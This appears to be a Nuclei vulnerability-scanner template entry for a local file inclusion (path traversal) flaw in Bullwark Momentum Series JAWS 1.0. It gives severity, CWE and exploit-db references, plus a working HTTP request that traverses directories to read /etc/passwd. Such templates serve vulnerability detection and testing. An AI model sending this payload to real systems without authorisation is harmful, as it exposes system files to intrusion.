# Nuclei Template: Bullwark Momentum Series JAWS 1.0 - Local File Inclusion
**Template ID:** bullwark-momentum-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`bullwark-momentum-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Bullwark Momentum Series JAWS 1.0 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET /../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Referer: {{Hostname}}
```

## References
- https://www.exploit-db.com/exploits/47773
- http://www.bullwark.net/Kategoriler.aspx?KategoriID=24
